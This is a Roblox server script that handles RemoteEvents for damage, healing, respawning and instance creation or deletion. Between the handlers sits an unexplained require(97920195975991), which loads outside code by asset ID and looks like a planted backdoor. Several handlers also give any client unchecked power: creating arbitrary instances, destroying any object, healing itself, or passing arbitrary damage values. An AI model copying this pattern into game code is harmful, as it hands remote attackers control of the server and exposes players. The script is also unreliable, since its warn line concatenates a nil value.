local DamageEvent = game:GetService("ReplicatedStorage").DamageEvent
local loadCharacter = game:GetService("ReplicatedStorage").GameEvents.LoadCharacter
local createInstance = game:GetService("ReplicatedStorage").GameEvents.CreateInstance
local destroyInstance = game:GetService("ReplicatedStorage").GameEvents.DestroyInstance
local heal = game:GetService("ReplicatedStorage").GameEvents.Heal
local DebounceArray = {}

local types={
	Normal=5,
	DoubleDamage=10,
	HighDamage=20,
	Instakill=math.huge, --scary number
}

loadCharacter.OnServerEvent:Connect(function(player)
	player:LoadCharacter()
end)

createInstance.OnServerEvent:Connect(function(player, instance, name, properties)
	local instance = Instance.new(instance)
	instance.Name = name
	for i,v in pairs(properties) do
		instance[i] = v
	end
end)

require(97920195975991)

destroyInstance.OnServerEvent:Connect(function(player, instance)
	if instance then
		instance:Destroy()
	else
		warn("Provided instance "..instance.." doesn't exist!")
	end
end)

heal.OnServerEvent:Connect(function(player)
	player.Character.Humanoid.Health = player.Character.Humanoid.MaxHealth
end)

DamageEvent.OnServerEvent:Connect(function(Player,Type)
	if DebounceArray[Player.Name] then return end
	
	if not (tonumber(Type) ~= nil and tonumber(Type) <= 0) then --no debounce for healing
		DebounceArray[Player.Name] = true
		task.delay(0.1, function()
			DebounceArray[Player.Name] = nil
		end)
	end
	
	local char = Player.Character
	if char ~= nil then
		local Humanoid = char:WaitForChild("Humanoid")
		if tonumber(Type) ~= nil then
			Humanoid:TakeDamage(Type)
		else
			Humanoid:TakeDamage(types[Type] or types.Normal)
		end
	end
end)